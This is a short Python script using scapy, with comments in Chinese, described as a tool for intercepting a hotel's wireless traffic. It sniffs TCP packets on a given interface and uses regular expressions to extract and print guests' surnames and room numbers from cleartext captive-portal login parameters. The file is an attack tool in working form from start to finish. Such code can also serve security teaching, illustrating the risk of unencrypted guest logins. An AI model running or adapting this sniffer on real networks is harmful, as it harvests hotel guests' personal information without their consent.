#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/19
# Created by 冰河
# Description 截获宾馆中无线数据流量中的用户信息，本程序以正则表达式匹配PROVIDED_LAST_NAME=XXX&PROVIDED_ROOM_NUMBER=1337的字符串
# 博客 https://blog.csdn.net/l1028386804

import optparse
from scapy.all import *

#查找用户信息,即姓+房间号
def findGest(pkt):
    #把载荷中的二进制内容复制到raw中
    raw = pkt.sprintf('%Raw.load%')
    #匹配以PROVIDED_LAST_NAME=开头 以&结尾
    name = re.findall('(?i)PROVIDED_LAST_NAME=(.*)&', raw)
    room = re.findall('(?i)PROVIDED_ROOM_NUMBER=(.*)', raw)
    if name:
        print '[+] Found Hotel Guest: ' + str(name[0]) + ', Room: ' + str(room[0])


def main():
    parser = optparse.OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Hotel Guest Sniffer.'
        sniff(filter='tcp', prn=findGest, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
